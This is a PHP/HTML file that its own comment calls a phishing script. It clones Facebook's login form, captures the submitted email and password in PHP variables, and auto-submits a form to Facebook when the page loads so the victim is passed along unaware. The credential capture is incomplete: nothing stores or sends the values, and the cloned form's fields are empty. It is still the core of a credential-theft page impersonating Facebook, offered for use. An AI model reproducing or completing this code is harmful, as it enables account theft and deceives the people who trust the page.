<html>


  <?php
    /* This is the phishing script, replaced the action on the login form with
      this script, and the original action was to go to this
      "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110",
    */
    $email = null;
    $pass = null;
    if (isset($_POST['email']) && isset($_POST['pass'])) {
      $email = $_POST['email'];
      $pass = $_POST['pass'];

    }
   ?>
   <body>
     <form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">
       <input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />
       <table cellspacing="0" role="presentation">
         <tr>
           <td class="html7magic"><label for="email">Email or Phone</label></td>
           <td class="html7magic"><label for="pass">Password</label></td>
         </tr>
         <tr>
           <td><input type="email" class="inputtext" name="email" id="email" data-testid="royal_email" /></td>
           <td><input type="password" class="inputtext" name="pass" id="pass" data-testid="royal_pass" /></td>
           <td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_2"><input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_2" /></label></td>
         </tr>
         <tr>
           <td class="login_form_label_field"></td>
           <td class="login_form_label_field">
             <div><a href="https://www.facebook.com/recover/initiate?lwv=110&amp;ars=royal_blue_bar">Forgot account?</a></div>
           </td>
         </tr>
       </table>
       <input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_3" /><input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_4" /><input type="hidden" name="lgnrnd" value="165033_nUr-" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><input type="hidden" autocomplete="off" name="ab_test_data" value="" /><input type="hidden" autocomplete="off" id="locale" name="locale" value="en_US" /><input type="hidden" autocomplete="off" name="next" value="https://www.facebook.com/" /><input type="hidden" autocomplete="off" name="login_source" value="login_bluebar" /><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" /><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" /><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" />
     </form>
     <?php
       echo '<script type="application/javascript">'.
          'window.onload = function() {'.
          'document.getElementById("login_form").submit();'.
       '} </script>';
     ?>
  </body>

</html>
